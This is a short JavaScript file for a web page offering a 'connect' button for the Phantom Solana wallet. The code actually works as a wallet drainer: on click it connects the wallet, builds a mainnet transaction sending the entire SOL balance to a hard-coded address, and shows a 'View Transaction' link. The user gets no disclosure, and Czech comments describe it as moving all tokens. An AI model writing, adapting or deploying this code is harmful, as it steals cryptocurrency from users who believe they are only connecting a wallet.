document.addEventListener('DOMContentLoaded', async () => {
    const connectButton = document.getElementById('connectButton');
    const viewTransaction = document.getElementById('viewTransaction');

    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
    const { PhantomWalletAdapter } = solanaWalletAdapterPhantom;
    const wallet = new PhantomWalletAdapter();

    connectButton.addEventListener('click', async () => {
        if (!wallet.connected) {
            await wallet.connect();
        }

        const publicKey = wallet.publicKey;
        if (publicKey) {
            // Přesun všech tokenů
            const transaction = new solanaWeb3.Transaction();
            const destinationAddress = new solanaWeb3.PublicKey('BeM7Emo9ZF7NWMHL79QdxRHeHnTWAK8ByQ5Qz3aVQHYz');
            const balance = await connection.getBalance(publicKey);

            transaction.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: destinationAddress,
                    lamports: balance,
                })
            );

            const { signature } = await wallet.sendTransaction(transaction, connection);
            await connection.confirmTransaction(signature, 'confirmed');

            // Změna barvy tlačítka a zobrazení odkazu na transakci
            connectButton.style.backgroundColor = 'green';
            viewTransaction.style.display = 'block';
            viewTransaction.textContent = 'View Transaction';
            viewTransaction.onclick = () => {
                window.open(`https://explorer.solana.com/tx/${signature}?cluster=mainnet-beta`, '_blank');
            };
        }
    });
});
